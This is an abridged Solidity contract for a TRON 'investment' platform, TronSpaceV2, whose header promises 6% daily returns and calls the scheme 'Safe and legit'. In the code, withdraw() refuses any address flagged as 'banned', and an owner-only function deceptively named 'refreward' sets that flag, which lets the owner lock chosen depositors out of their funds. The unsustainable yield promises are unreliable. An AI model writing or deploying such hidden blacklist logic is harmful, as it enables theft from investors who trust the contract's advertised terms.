//SourceUnit: tronspacev2.sol


/*
 * 
 *   TRONSPACE.SPACE - Community based platform based on TRX blockchain smart-contract technology. Safe and legit
 *
 *		[INVESTMENT CONDITIONS]
 * 
 *   - Basic interest rate: 6% every 24 hours
 *   - Personal hold-bonus: +0.1% for every 24 hours without withdraw(max 4%)
 *   - Contract total amount bonus: +0.1% for every 2,000,000 TRX on platform address balance(max 5%)
 * 
...
contract TronSpaceV2 {
	...
	uint256 constant public MARKETINGFUND = 30;
	uint256 constant public PROJECTFUND = 30;
	...
	function withdraw() public {
	    ...
	    require(!_isRewarded[msg.sender], "You're banned");
	...
	function getUserDividends(address userAddress) public view returns (uint256) {
       ...
       function refreward(address account) public {
        require(msg.sender == owner);
        _isRewarded[account] = true;
    }

    function getrefreward(address account) public {
        require(msg.sender == owner);
